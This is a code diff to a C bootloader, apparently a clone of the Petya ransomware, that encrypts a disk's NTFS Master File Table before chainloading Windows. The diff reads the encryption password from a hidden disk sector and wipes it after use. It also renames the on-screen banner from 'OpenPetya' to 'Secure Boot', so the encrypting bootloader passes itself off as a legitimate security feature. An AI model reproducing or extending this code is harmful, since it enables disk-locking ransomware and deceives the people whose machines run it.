@@ -10,6 +10,7 @@
 #include "state.h"
 #include "ntfs_crypt.h"
 #include "hidden_store.h"
+#include "password_store.h"
 
 #define PASSWORD "123456"
 #define MAX_ATTEMPTS 3
@@ -284,7 +285,7 @@ void do_encryption(void)
     vga_clear();
 
     vga_set_color(COLOR_WHITE_ON_BLUE);
-    vga_puts("OpenPetya, 1st stage.");
+    vga_puts("Secure Boot, 1st stage.");
     vga_set_color(COLOR_WHITE_ON_BLACK);
     vga_puts("\n\n");
 
@@ -323,13 +324,27 @@ void do_encryption(void)
     }
 
     vga_puts("[3/4] Encrypting MFT...\n");
-    if (ntfs_mft_encrypt(PASSWORD, PARTITION_LBA) != 0)
+    char password[65];
+    if (pwstore_read(password, sizeof(password)) != 0)
     {
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("Error: No password in sector 59.\n");
+
+        goto halt;
+    }
+
+    if (ntfs_mft_encrypt(password, PARTITION_LBA) != 0)
+    {
+        zero_buffer(password, sizeof(password));
+
         vga_set_color(COLOR_RED_ON_BLACK);
         vga_puts("ERROR: MFT encryption failed!\n");
 
         goto halt;
     }
+
+    zero_buffer(password, sizeof(password));
+    pwstore_erase();
 
     vga_puts("[4/4] Saving state...\n");
     if (state_write(STATE_ENCRYPTED) != 0)
@@ -361,7 +376,7 @@ void login(void)
     vga_clear();
 
     vga_set_color(COLOR_WHITE_ON_BLUE);
-    vga_puts("OpenPetya");
+    vga_puts("Secure Boot");
     vga_puts("\n\n");
 
     vga_set_color(COLOR_WHITE_ON_BLACK);
@@ -433,7 +448,7 @@ void login(void)
             vga_puts("\n[4/4] Booting Windows...\n");
             vga_puts("Custom bootloader has been removed.\n");
 
-            sleep(3000);
+            for (volatile uint32_t _i = 0; _i < 15000000; _i++);
 
             do_chainload();
         }
